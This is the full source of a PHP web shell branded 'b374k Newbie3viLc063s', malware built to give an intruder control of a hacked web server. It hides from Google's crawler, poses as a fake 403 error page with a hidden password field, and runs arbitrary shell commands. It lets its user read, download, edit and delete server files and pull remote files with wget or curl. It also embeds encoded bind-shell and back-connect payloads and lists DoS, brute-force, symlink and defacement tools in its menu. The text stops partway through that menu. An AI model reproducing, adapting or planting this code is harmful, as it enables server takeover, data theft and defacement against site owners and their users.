

<?php 
/*********************************************************************************************************/
$auth_pass = ""; //password crypted with md5, default is 'Newbie3viLc063s'
/*********************************************************************************************************/
$color = "#00ff00";
$default_action = 'FilesMan';
@define('SELF_PATH', __FILE__);

/*********************************************************************************************************/
# Avoid google's crawler
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) { header('HTTP/1.0 404 Not Found'); exit; }
/*********************************************************************************************************/

@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@define('VERSION', 'v.2012');
@define('TITLE', ':: b374k Newbie3viLc063s 2012 ::');

/*********************************************************************************************************/

if( get_magic_quotes_gpc() ) 
{
	function stripslashes_array($array) { return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array); }
	$_POST = stripslashes_array($_POST);
}

function logout()
{
	unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	$page = $host='http://'.$_SERVER['SERVER_NAME'].'/'.$_SERVER['PHP_SELF'];
        echo '<center><span class="b1">The System Is Going To Down For LogOut Administrator Pages!!</scan></center>';
	?>
	<script>window.location.href = '<?php print $page; ?>';</script>
	<?php
	exit(0);
}

$disablefunc = @ini_get("disable_functions");

function showdisablefunctions() {
    if ($disablefunc=@ini_get("disable_functions")){ return "<span style='color:#00FF1E'>".$disablefunc."</span>"; }
    else { return "<span style='color:#00FF1E'>NONE</span>"; }
  }
  
  function ex($cfe) {
$res = '';
if (!empty($cfe)) {
if(function_exists('exec')) {
@exec($cfe,$res);
$res = join("\n",$res);
} elseif(function_exists('shell_exec')) {
$res = @shell_exec($cfe);
} elseif(function_exists('system')) {
@ob_start();
@system($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(function_exists('passthru')) {
@ob_start();
@passthru($cfe);
$res = @ob_get_contents();
@ob_end_clean();
} elseif(@is_resource($f = @popen($cfe,"r"))) {
$res = "";
while(!@feof($f)) { $res .= @fread($f,1024); }
@pclose($f);
} else { $res = "Ex() Disabled!"; }
}
return $res;
}


function showstat($stat) {
if ($stat=="on") { return "<font color=#00FF00><b>ON</b></font>"; }
else { return "<font color=red><b>OFF</b></font>"; }
}
function testperl() {
if (ex('perl -h')) { return showstat("on"); }
else { return showstat("off"); }
}
function testfetch() {
if(ex('fetch --help')) { return showstat("on"); }
else { return showstat("off"); }
}
function testwget() {
if (ex('wget --help')) { return showstat("on"); }
else { return showstat("off"); }
}
function testoracle() {
if (function_exists('ocilogon')) { return showstat("on"); }
else { return showstat("off"); }
}
function testpostgresql() {
if (function_exists('pg_connect')) { return showstat("on"); }
else { return showstat("off"); }
}
function testmssql() {
if (function_exists('mssql_connect')) { return showstat("on"); }
else { return showstat("off"); }
}
function testcurl() {
if (function_exists('curl_version')) { return showstat("on"); }
else { return showstat("off"); }
}
function testmysql() {
if (function_exists('mysql_connect')) { return showstat("on"); }
else { return showstat("off"); }
}

$quotes = get_magic_quotes_gpc();
if ($quotes == "1" or $quotes == "on")
{
$quot = "<font color='red'>ON</font>";
}
else
{
$quot = "<font color='green'>OFF</font>";
}

function printLogin() 
{
	?>
<html>
	<head>
	<style> input { margin:0;background-color:#fff;border:1px solid #fff; } </style>
	</head>
        <title>
        403 Forbidden
        </title>
        <body>
	<h1>Forbidden</h1>
	<p>You don't have permission to access this file on this server <?=$_SERVER['HTTP_HOST']?>.</p>
	<hr>
	<form method=post>
	<address>Apache/2.2.8 at <?=$_SERVER['HTTP_HOST']?> Port 80<center><input type=password name=x><input type=submit value=''></center></address>
	</form>
	</body>
</html>
	<?php
	exit;
}

if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
	{
	if( empty( $auth_pass ) || ( isset( $_POST['x'] ) && ( md5($_POST['x']) == $auth_pass ) ) )
		{ $_SESSION[md5($_SERVER['HTTP_HOST'])] = true; }
	else
		{ printLogin(); }
	}

if(isset($_GET['dl']) && ($_GET['dl'] != ""))
	{ 
	$file 	= $_GET['dl']; 
	$filez 	= @file_get_contents($file); 
	header("Content-type: application/octet-stream"); 
	header("Content-length: ".strlen($filez)); 
	header("Content-disposition: attachment; 
	filename=\"".basename($file)."\";"); 
	echo $filez; 
	exit; 
	} 

elseif(isset($_GET['dlgzip']) && ($_GET['dlgzip'] != ""))
	{ 
	$file = $_GET['dlgzip']; 
	$filez = gzencode(@file_get_contents($file)); 
	header("Content-Type:application/x-gzip\n"); 
	header("Content-length: ".strlen($filez)); 
	header("Content-disposition: attachment; filename=\"".basename($file).".gz\";"); 
	echo $filez; exit; 
	} 

if(isset($_GET['img']))
	{ 
	@ob_clean(); 
	$d = magicboom($_GET['y']); 
	$f = $_GET['img']; 
	$inf = @getimagesize($d.$f); 
	$ext = explode($f,"."); 
	$ext = $ext[count($ext)-1]; 
	@header("Content-type: ".$inf["mime"]); 
	@header("Cache-control: public"); 
	@header("Expires: ".date("r",mktime(0,0,0,1,1,2030))); 
	@header("Cache-control: max-age=".(60*60*24*7)); 
	@readfile($d.$f); 
	exit; 
	} 
$ver = VERSION;

$DISP_SERVER_SOFTWARE = getenv("SERVER_SOFTWARE");

if (@ini_get("safe_mode") or strtolower(@ini_get("safe_mode")) == "on") $safemode = TRUE; 
else $safemode 	= FALSE; 
$system 	= @php_uname(); 

if(strtolower(substr($system,0,3)) == "win") $win = TRUE; 
else $win 	= FALSE; 

if(isset($_GET['y']))
	{ if(@is_dir($_GET['view'])){ $pwd = $_GET['view']; @chdir($pwd); } else{ $pwd = $_GET['y']; @chdir($pwd); } } 

if(!$win)
	{ if(!$user = rapih(exe("whoami"))) $user = ""; if(!$id = rapih(exe("id"))) $id = ""; $prompt = $user." \$ "; $pwd = @getcwd().DIRECTORY_SEPARATOR; } 
else 
	{ 
	$user 	= @get_current_user(); 
	$id 	= $user; 
	$prompt = $user." &gt;"; 
	$pwd 	= realpath(".")."\\"; 
	$v 	= explode("\\",$d); 
	$v 	= $v[0]; 
	foreach (range("A","Z") as $letter) 
		{ 
		$bool = @is_dir($letter.":\\"); 
		if ($bool) 
			{ 
			$letters 	.= "<a href=\"?y=".$letter.":\\\">[ "; 
			if ($letter.":" != $v) {$letters .= $letter;} 
			else {$letters 	.= "<span class=\"gaya\">".$letter."</span>";} 
			$letters 	.= " ]</a> "; 
			} 
		} 
	} 

if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE; 
else $posix = FALSE; 

        $bytes = disk_free_space("."); 
        $si_prefix = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
        $base = 1024;
        $class = min((int)log($bytes , $base) , count($si_prefix) - 1);
        $totalspace_bytes = disk_total_space("."); 
    	$totalspace_si_prefixs = array( 'B', 'KB', 'MB', 'GB', 'TB', 'EB', 'ZB', 'YB' );
        $totalspace_bases = 1024;
    	$totalspace_class = min((int)log($totalspace_bytes , $totalspace_bases) , count($totalspace_si_prefixs) - 1);
        $totalspace_show = sprintf('%1.2f' , $totalspace_bytes / pow($totalspace_bases,$totalspace_class)) . ' ' . $totalspace_si_prefixs[$totalspace_class] . '';
        $freespace_show = sprintf('%1.2f' , $bytes / pow($base,$class)) . ' ' . $si_prefix[$class] . '';
	$server_ip 	= @gethostbyname($_SERVER["HTTP_HOST"]); 
	$my_ip 		= $_SERVER['REMOTE_ADDR']; 
	$bindport 	= "55555"; 
	$bindport_pass 	= "Newbie3viLc063s"; 
	$pwds 		= explode(DIRECTORY_SEPARATOR,$pwd); 
	$pwdurl 	= ""; 
	for($i = 0 ; $i < sizeof($pwds)-1 ; $i++)
		{ 
		$pathz 	= ""; 
		for($j 	= 0 ; $j <= $i ; $j++)
			{ 
			$pathz .= $pwds[$j].DIRECTORY_SEPARATOR; 
			} 
		$pwdurl .= "<a href=\"?y=".$pathz."\">".$pwds[$i]." ".DIRECTORY_SEPARATOR." </a>"; 
		} 

	if(isset($_POST['rename'])){ $old = $_POST['oldname']; $new = $_POST['newname']; @rename($pwd.$old,$pwd.$new); $file = $pwd.$new; } 
	$buff = $DISP_SERVER_SOFTWARE."<br />"; 
	$buff .= $system."<br />"; 
	if($id != "") $buff .= $id."<br />"; 
	$buff .= "Server IP : "."<span style='color:#FF8800'>$server_ip</span>"."<font> | </font>"."Your IP : "."<span style='color:#FF0000'>$my_ip</span>"."<br />";
        $buff .= "Total HDD Space : "."<span style='color:#00FF1E'>$totalspace_show</span>"."<font> | </font>"."Free HDD Space : "."<span style='color:#00FF1E'>$freespace_show</span>"."<br />";
		$buff .=  "Magic Quotes:$quot"."<br>";
		$buff .= "Disabled Functions: ".showdisablefunctions()."<br>";
		$buff .= "MySQL: ".testmysql()." MSSQL: ".testmssql()." Oracle: ".testoracle()." MSSQL: ".testmssql()." PostgreSQL: ".testpostgresql()." cURL: ".testcurl()." WGet: ".testwget()." Fetch: ".testfetch()." Perl: ".testperl()."<br>";
	if($safemode) $buff .= "safemode <span class=\"gaya\">ON</span><br />"; 
	else $buff .= "safemode <span class=\"gaya\">OFF<span><br />"; 
	$buff .= $letters."&nbsp;&gt;&nbsp;".$pwdurl; 

	function rapih($text){ return trim(str_replace("<br />","",$text)); } 

	function magicboom($text){ if (!get_magic_quotes_gpc()) { return $text; } return stripslashes($text); } 

	function showdir($pwd,$prompt)
	{ 
		$fname = array(); 
		$dname = array(); 
		if(function_exists("posix_getpwuid") && function_exists("posix_getgrgid")) $posix = TRUE; 
		else $posix = FALSE; 
		$user = "????:????"; 
		if($dh = opendir($pwd))
			{ 
			while($file = readdir($dh))
				{ 
				if(is_dir($file))
					{ $dname[] = $file; } 
				elseif(is_file($file))
					{ $fname[] = $file; } 
				} 
			closedir($dh); 
			} 
		sort($fname); 
		sort($dname); 
		$path = @explode(DIRECTORY_SEPARATOR,$pwd); 
		$tree = @sizeof($path); 
		$parent = ""; 
		$buff = "<form action=\"?y=".$pwd."&amp;x=shell\" method=\"post\" style=\"margin:8px 0 0 0;\"> 
				<table class=\"cmdbox\" style=\"width:50%;\"> 
				<tr>
				<td>CMD@$prompt</td>
				<td><input onMouseOver=\"this.focus();\" id=\"cmd\" class=\"inputz\" type=\"text\" name=\"cmd\" style=\"width:400px;\" value=\"\" />
				<input class=\"inputzbut\" type=\"submit\" value=\"Execute !\" name=\"submitcmd\" style=\"width:80px;\" /></td>
				</tr> 
			</form> 
			<form action=\"?\" method=\"get\" style=\"margin:8px 0 0 0;\"> 
				<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
				<tr>
				<td>view file/folder</td>
				<td><input onMouseOver=\"this.focus();\" id=\"goto\" class=\"inputz\" type=\"text\" name=\"view\" style=\"width:400px;\" value=\"".$pwd."\" />
				<input class=\"inputzbut\" type=\"submit\" value=\"Enter !\" name=\"submitcmd\" style=\"width:80px;\" /></td>
				</tr> 
			</form>
			</table>
			<table class=\"explore\"> 
				<tr>
				<th>name</th>
				<th style=\"width:80px;\">size</th>
				<th style=\"width:210px;\">owner:group</th>
				<th style=\"width:80px;\">perms</th>
				<th style=\"width:110px;\">modified</th>
				<th style=\"width:190px;\">actions</th>
				</tr> "; 

		if($tree > 2) for($i=0;$i<$tree-2;$i++) $parent .= $path[$i].DIRECTORY_SEPARATOR; 
		else $parent = $pwd; 
		foreach($dname as $folder)
			{ 
			if($folder == ".") 
				{ 
				if(!$win && $posix)
					{ 
					$name=@posix_getpwuid(@fileowner($folder)); 
					$group=@posix_getgrgid(@filegroup($folder)); 
					$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name']; 
					} 
				else { $owner = $user; } 
				$buff .= "<tr>
						<td><a href=\"?y=".$pwd."\">$folder</a></td>
						<td>-</td>
						<td style=\"text-align:center;\">".$owner."</td>
						<td>".get_perms($pwd)."</td>
						<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($pwd))."</td>
						<td><span id=\"titik1\">
							<a href=\"?y=$pwd&amp;edit=".$pwd."newfile.php\">newfile</a> 
							| <a href=\"javascript:tukar('titik1','titik1_form');\">newfolder</a>
						    </span> 
						<form action=\"?\" method=\"get\" id=\"titik1_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
							<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
							<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /> 
							<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go\" /> 
						</form>
						</td>
					</tr> "; 
				} 
			elseif($folder == "..") 
				{ 
				if(!$win && $posix)
					{ 
					$name=@posix_getpwuid(@fileowner($folder)); 
					$group=@posix_getgrgid(@filegroup($folder)); 
					$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name']; 
					} 
				else 	{ $owner = $user; } 
				$buff .= "<tr>
						<td><a href=\"?y=".$parent."\">$folder</a></td>
						<td>-</td>
						<td style=\"text-align:center;\">".$owner."</td>
						<td>".get_perms($parent)."</td>
						<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($parent))."</td>
						<td><span id=\"titik2\">
							<a href=\"?y=$pwd&amp;edit=".$parent."newfile.php\">newfile</a> 
							| <a href=\"javascript:tukar('titik2','titik2_form');\">newfolder</a>
						    </span> 
						<form action=\"?\" method=\"get\" id=\"titik2_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
							<input type=\"hidden\" name=\"y\" value=\"".$pwd."\" /> 
							<input class=\"inputz\" style=\"width:140px;\" type=\"text\" name=\"mkdir\" value=\"a_new_folder\" /> 
							<input class=\"inputzbut\" type=\"submit\" name=\"rename\" style=\"width:35px;\" value=\"Go\" /> 
						</form> 
						</td>
					</tr>"; 
				} 
			else 
				{ 
				if(!$win && $posix)
					{ 
					$name=@posix_getpwuid(@fileowner($folder)); 
					$group=@posix_getgrgid(@filegroup($folder)); 
					$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name']; 
					} 
				else { $owner = $user; } 
				$buff .= "<tr>
						<td>
						<a id=\"".clearspace($folder)."_link\" href=\"?y=".$pwd.$folder.DIRECTORY_SEPARATOR."\">[ $folder ]</a> 
						<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($folder)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
							<input type=\"hidden\" name=\"oldname\" value=\"".$folder."\" style=\"margin:0;padding:0;\" /> 
							<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$folder."\" /> 
							<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> 
							<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
							onclick=\"tukar('".clearspace($folder)."_form','".clearspace($folder)."_link');\" /> 
						</form> 
						</td>
						<td>DIR</td>
						<td style=\"text-align:center;\">".$owner."</td>
						<td>".get_perms($pwd.$folder)."</td>
						<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($folder))."</td>
						<td><a href=\"javascript:tukar('".clearspace($folder)."_link','".clearspace($folder)."_form');\">rename</a> 
						| <a href=\"?y=$pwd&amp;fdelete=".$pwd.$folder."\">delete</a>
						</td>
						</tr>"; 
				} 
			} 
		foreach($fname as $file)
			{ 
			$full = $pwd.$file; 
			if(!$win && $posix)
				{ 	
				$name=@posix_getpwuid(@fileowner($file)); 
				$group=@posix_getgrgid(@filegroup($file)); 
				$owner = $name['name']."<span class=\"gaya\"> : </span>".$group['name']; 
				} 
			else { $owner = $user; } 
			$buff .= "<tr>
					<td><a id=\"".clearspace($file)."_link\" href=\"?y=$pwd&amp;view=$full\">$file</a> 
					<form action=\"?y=$pwd\" method=\"post\" id=\"".clearspace($file)."_form\" class=\"sembunyi\" style=\"margin:0;padding:0;\"> 
						<input type=\"hidden\" name=\"oldname\" value=\"".$file."\" style=\"margin:0;padding:0;\" /> 
						<input class=\"inputz\" style=\"width:200px;\" type=\"text\" name=\"newname\" value=\"".$file."\" /> 
						<input class=\"inputzbut\" type=\"submit\" name=\"rename\" value=\"rename\" /> 
						<input class=\"inputzbut\" type=\"submit\" name=\"cancel\" value=\"cancel\" 
							onclick=\"tukar('".clearspace($file)."_link','".clearspace($file)."_form');\" /> 
					</form> </td>
					<td>".ukuran($full)."</td>
					<td style=\"text-align:center;\">".$owner."</td>
					<td>".get_perms($full)."</td>
					<td style=\"text-align:center;\">".date("d-M-Y H:i",@filemtime($full))."</td> 
					<td><a href=\"?y=$pwd&amp;edit=$full\">edit</a> 
					| <a href=\"javascript:tukar('".clearspace($file)."_link','".clearspace($file)."_form');\">rename</a> 
					| <a href=\"?y=$pwd&amp;delete=$full\">delete</a> 
					| <a href=\"?y=$pwd&amp;dl=$full\">download</a>&nbsp;(<a href=\"?y=$pwd&amp;dlgzip=$full\">gz</a>)
					</td>
				</tr>"; 
			} 
		$buff .= "</table>"; return $buff; 
	} 

	function ukuran($file)
	{ 
		if($size = @filesize($file))
			{ 	
			if($size <= 1024) return $size; 
			else
				{ 
				if($size <= 1024*1024) 
					{ $size = @round($size / 1024,2);; return "$size kb"; } 
				else { $size = @round($size / 1024 / 1024,2); return "$size mb"; } 
				} 
			} 
		else return "???"; 
	} 

	function exe($cmd)
	{ 
		if(function_exists('system')) 
			{ 
			@ob_start(); 
			@system($cmd); 
			$buff = @ob_get_contents();
			@ob_end_clean(); 
			return $buff; 
			} 
		elseif(function_exists('exec')) 
			{ 
			@exec($cmd,$results); 
			$buff = ""; 
			foreach($results as $result)
				{ $buff .= $result; } 
			return $buff; 
			} 
		elseif(function_exists('passthru')) 
			{ 
			@ob_start(); 
			@passthru($cmd); 
			$buff = @ob_get_contents(); 
			@ob_end_clean(); 
			return $buff; 
			} 
		elseif(function_exists('shell_exec'))
			{ 
			$buff = @shell_exec($cmd); 
			return $buff; 
			} 
	} 

	function tulis($file,$text)
	{ 
	$textz = gzinflate(base64_decode($text)); 
	if($filez = @fopen($file,"w")) 
		{ 
		@fputs($filez,$textz); 
		@fclose($file); 
		} 
	} 

	function ambil($link,$file) 
	{ 
	if($fp = @fopen($link,"r"))
		{ 
		while(!feof($fp)) 
			{ 
			$cont.= @fread($fp,1024); 
			} 
		@fclose($fp); 
		$fp2 = @fopen($file,"w"); 
		@fwrite($fp2,$cont); 
		@fclose($fp2); 
		} 
	} 

	function which($pr)
	{ 
	$path = exe("which $pr"); 
	if(!empty($path)) 
		{ return trim($path); } 
	else { return trim($pr); } 
	} 

	function download($cmd,$url)
	{ 
	$namafile = basename($url); 
	switch($cmd) 
		{ 
		case 'wwget': exe(which('wget')." ".$url." -O ".$namafile); break; 
		case 'wlynx': exe(which('lynx')." -source ".$url." > ".$namafile); break; 
		case 'wfread' : ambil($wurl,$namafile);break; 
		case 'wfetch' : exe(which('fetch')." -o ".$namafile." -p ".$url);break; 
		case 'wlinks' : exe(which('links')." -source ".$url." > ".$namafile);break; 
		case 'wget' : exe(which('GET')." ".$url." > ".$namafile);break; 
		case 'wcurl' : exe(which('curl')." ".$url." -o ".$namafile);break; 
		default: break; } 
	return $namafile; 
	} 

	function get_perms($file) 
	{ 
		if($mode=@fileperms($file))
			{ 
			$perms=''; 
			$perms .= ($mode & 00400) ? 'r' : '-'; 
			$perms .= ($mode & 00200) ? 'w' : '-'; 
			$perms .= ($mode & 00100) ? 'x' : '-'; 
			$perms .= ($mode & 00040) ? 'r' : '-'; 
			$perms .= ($mode & 00020) ? 'w' : '-'; 
			$perms .= ($mode & 00010) ? 'x' : '-'; 
			$perms .= ($mode & 00004) ? 'r' : '-'; 
			$perms .= ($mode & 00002) ? 'w' : '-'; 
			$perms .= ($mode & 00001) ? 'x' : '-'; 
			return $perms; 
			} 
		else return "??????????"; 
	} 

	function clearspace($text){ return str_replace(" ","_",$text); } 

	$port_bind_bd_c="bVNhb9owEP2OxH+4phI4NINAN00aYxJaW6maxqbSLxNDKDiXxiLYkW3KGOp/3zlOpo7xIY793jvf +fl8KSQvdinCR2NTofr5p3br8hWmhXw6BQ9mYA8lmjO4UXyD9oSQaAV9AyFPCNRa+pRCWtgmQrJE P/GIhufQg249brd4nmjo9RxBqyNAuwWOdvmyNAKJ+ywlBirhepctruOlW9MJdtzrkjTVKyFB41ZZ dKTIWKb0hoUwmUAcwtFt6+m+EXKVJVtRHGAC07vV/ez2cfwvXSpticytkoYlVglX/fNiuAzDE6VL 3TfVrw4o2P1senPzsJrOfoRjl9cfhWjvIatzRvNvn7+s5o8Pt9OvURzWZV94dQgleag0C3wQVKug Uq2FTFnjDzvxAXphx9cXQfxr6PcthLEo/8a8q8B9LgpkQ7oOgKMbvNeThHMsbSOO69IA0l05YpXk HDT8HxrV0F4LizUWfE+M2SudfgiiYbONxiStebrgyIjfqDJG07AWiAzYBc9LivU3MVpGFV2x1J4W tyxAnivYY8HVFsEqWF+/f7sBk2NRQKcDA/JtsE5MDm9EUG+MhcFqkpX0HmxGbqbkdBTMldaHRsUL ZeoDeOSFBvpefCfXhflOpgTkvJ+jtKiR7vLohYKCqS2ZmMRj4Z5gQZfSiMbi6iqkdnHarEEXYuk6 uPtTdumsr0HC4q5rrzNifV7sC3ZWUmq+LVlVa5OfQjTanZYQO+Uf"; 
	$port_bind_bd_pl="ZZJhT8IwEIa/k/AfjklgS2aA+BFmJDB1cW5kHSZGzTK2Qxpmu2wlYoD/bruBIfitd33uvXuvvWr1 NmXRW1DWy7HImo02ebRd19Kq1CIuV3BNtWGzQZeg342DhxcYwcCAHeCWCn1gDOEgi1yHhLYXzfwg tNqKeut/yKJNiUB4skYhg3ZecMETnlmfKKrz4ofFX6h3RZJ3DUmUFaoTszO7jxzPDs0O8SdPEQkD e/xs/gkYsN9DShG0ScwEJAXGAqGufmdq2hKFCnmu1IjvRkpH6hE/Cuw5scfTaWAOVE9pM5WMouM0 LSLK9HM3puMpNhp7r8ZFW54jg5wXx5YZLQUyKXVzwdUXZ+T3imYoV9ds7JqNOElQTjnxPc8kRrVo vaW3c5paS16sjZo6qTEuQKU1UO/RSnFJGaagcFVbjUTCqeOZ2qijNLWzrD8PTe32X9oOgvM0bjGB +hecfOQFlT4UcLSkmI1ceY3VrpKMy9dWUCVCBfTlQX6Owy8="; 

	$back_connect="fZFRS8MwFIXfB/sPWSw2hUrnqyPC0CpD3KStvqh0XRpcsE1KkoKF/XiTtCIV6tu55+Z89yY5W0St ktGB8aihsprPWkVBKsgn1av5zCN1iQGsOv4Fbak6pWmNgU/JUQC4b3lRU3BR7OFqcFhptMOpo28j S2whVulCflCNvXVy//K6fLdWI+SPcekMVpSlxIxTnRdacDSEAnA6gZJRBGMphbwC3uKNw8AhXEKZ ja3ImclYagh61n9JKbTAhu7EobN3Qb4mjW/byr0BSnc3D3EWgqe7fLO1whp5miXx+tHMcNHpGURw Tskvpd92+rxoKEdpdrvZhgBen/exUWf3nE214iT52+r/Cw3/5jaqhKL9iFFpuKPawILVNw=="; $back_connect_c="XVHbagIxEH0X/IdhhZLUWF1f1YKIBelFqfZJliUm2W7obiJJLLWl/94k29rWhyEzc+Z2TjpSserA BYyt41JfldftVuc3d7R9q9mLcGeAEk5660sVAakc1FQqFBxqnhkBVlIDl95/3Wa43fpotyCABR95 zzpzYA7CaMq5yaUCK1VAYpup7XaYZpPE1NArIBmBRzgVtVYoJQMcR/jV3vKC1rI6wgSmN/niYb75 i+21cR4pnVYWUaclivcMM/xvRDjhysbHVwde0W+K0wzH9bt3YfRPingClVCnim7a/ZuJC0JTwf3A RkD0fR+B9XJ2m683j/PpPYHFavW43CzzzWyFIfbIAhBiWinBHCo4AXSmFlxiuPB3E0/gXejiHMcY jwcYguIAe2GMNijZ9jL4GYqTSB9AvEmHGjk/m19h1CGvPoHIY5A1Oh2tE3XIe1bxKw77YTyt6T2F 6f9wGEPxJliFkv5Oqr4tE5LYEnoyIfDwdHcXK1ilrfAdUbPPLw=="; 
	?> 

<html>
	<head>
    	<link rel="shortcut icon" href="http://www.cpm-hosting.com/favicon.ico" type="image/x-icon" />
		<title><?php print TITLE; ?> <?php echo VERSION; ?></title> 
		<script type="text/javascript"> 

		function tukar(lama,baru)
			{ 
			document.getElementById(lama).style.display = 'none'; 
			document.getElementById(baru).style.display = 'block'; 
			} 

		</script> 
		<style type="text/css"> 
			AKUSTYLE		{ display:none; }
			body			{ background:#0F0E0E; } 
			A:link                  {COLOR: #2BA8EC; TEXT-DECORATION: none }
			A:visited 		{COLOR: #2BA8EC; TEXT-DECORATION: none }
			A:hover 		{text-shadow: 0pt 0pt 0.3em cyan, 0pt 0pt 0.3em cyan; color: #ff9900; TEXT-DECORATION: none }
			A:active 		{color: Red; TEXT-DECORATION: none }
			textarea 		{BORDER-RIGHT:  #3e3e3e 1px solid; BORDER-TOP:    #3e3e3e 1px solid; BORDER-LEFT:   #3e3e3e 1px solid; BORDER-BOTTOM: #3e3e3e 1px solid; BACKGROUND-COLOR: #1b1b1b; font: Fixedsys bold; color: #aaa; }
			*			{ font-size:11px; font-family:Tahoma,Verdana,Arial; color:#FFFFFF; } 
			#menu			{ background:#111111; margin:2px 2px 2px 2px; } 
			#menu a			{ padding:4px 18px; margin:0; background:#222222; text-decoration:none; letter-spacing:2px; } 
			#menu a:hover		{ background:#744F4F; border-bottom:1px solid #333333; border-top:1px solid #333333; } 
			.tabnet			{ margin:15px auto 0 auto; border: 1px solid #333333; } 
			.main 			{ width:100%; } 
			.gaya 			{ color: #4C83AF; } 
			.your_ip 		{ color: #FF4719; } 
			.inputz			{ background:#796767; border:0; padding:2px; border-bottom:1px solid #222222; border-top:1px solid #222222; } 
			.inputzbut		{ background:#111111; color:#666666; margin:0 4px; border:1px solid #444444; } 
			.inputz:hover, 
			.inputzbut:hover	{ border-bottom:1px solid #4532F6; border-top:1px solid #D4CECE; color:#D4CECE; } 
			.output 		{ margin:auto; border:1px solid #FF0000; width:100%; height:400px; background:#000000; padding:0 2px; } 
			.cmdbox			{ width:100%; } 
			.head_info		{ padding: 0 4px; } 
			.b1			{ font-size:30px; padding:0; color:#FF0000; } 
			.b2			{ font-size:30px; padding:0; color: #FF9966; } 
			.b_tbl			{ text-align:center; margin:0 4px 0 0; padding:0 4px 0 0; border-right:1px solid #333333; } 
			.phpinfo table		{ width:100%; padding:0 0 0 0; } 
			.phpinfo td		{ background:#111111; color:#cccccc; padding:6px 8px;; } 

			.phpinfo th, th		{ background:#191919; border-bottom:1px solid #333333; font-weight:normal; } 
			.phpinfo h2, 
			.phpinfo h2 a		{ text-align:center; font-size:16px; padding:0; margin:30px 0 0 0; background:#222222; padding:4px 0; } 
			.explore		{ width:100%; } 
			.explore a 		{ text-decoration:none; } 
			.explore td		{ border-bottom:1px solid #DB2B2B; padding:0 8px; line-height:24px; } 
			.explore th		{ padding:3px 8px; font-weight:normal; } 
			.explore th:hover, 
			.phpinfo th:hover	{ border-bottom:1px solid #4C83AF; } 
			.explore tr:hover	{ background:#744F4F; } 
			.viewfile		{ background:#EDECEB; color:#000000; margin:4px 2px; padding:8px; } 
			.sembunyi		{ display:none; padding:0;margin:0; } 
		</style> 
	</head> 
<body onLoad="document.getElementById('cmd').focus();"> 
	<div class="main"> 
		<!-- head info start here --> 
		<div class="head_info"> 
			<table>
				<tr> 
					<td>
						<table class="b_tbl">
							<tr>
								<td>
								<a href="?">
								<span class="b1">b<span class="b2">3<span class="b1">7</span>4</span>k</span>
								</a>
								</td>
							</tr>
							<tr>
								<td>m1n1 Newbie3viLc063s <?php echo $ver; ?></td>
							</tr>
						</table>
					</td> 
					<td>
						<?php echo $buff; ?>
					</td> 
				</tr>
			</table>	
		</div> 
		<!-- head info end here --> 
   		<!-- menu start --> 
      		<div id="menu"> 
            <center>
			<a href="?<?php echo "y=".$pwd; ?>">			<b>Explore</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=shell">	<b>Shell</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=php">		<b>Eval</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=mysql">	<b>MySQL</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=phpinfo">	<b>PHP</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=netsploit">	<b>NetSploit</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=upload">	<b>Upload</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=mail">		<b>Mail</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=brute">	<b>BruteForce</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=readable">	<b>OpenDIR</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=dos">		<b>D0S</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=localdomain">	<b>LocalDomain</b></a> 
			<a href="?<?php echo "y=".$pwd; ?>&amp;x=zone-h">        <b>Zone-H</b></a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=symlink">        <b>Symlink</b></a><br><br>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=sqli-scanner">        <b>SQLI Scan</b></a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=web-info">        <b>Website Whois</b></a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=port-scanner">        <b>Port-Scanner</b></a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=wp-reset">        <b>WP Reset</b></a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=jm-reset">        <b>Jomlaa Reset</b></a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=cms-scanner">        <b>CMS Scanner</b></a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=vb">        <b>VB Changer</b></a>
            <a href="?<?php echo "y=".$pwd; ?>&amp;x=about">        <b>About</b></a>
			<a href="?x=out">		<b>Log-Out</b></a> 
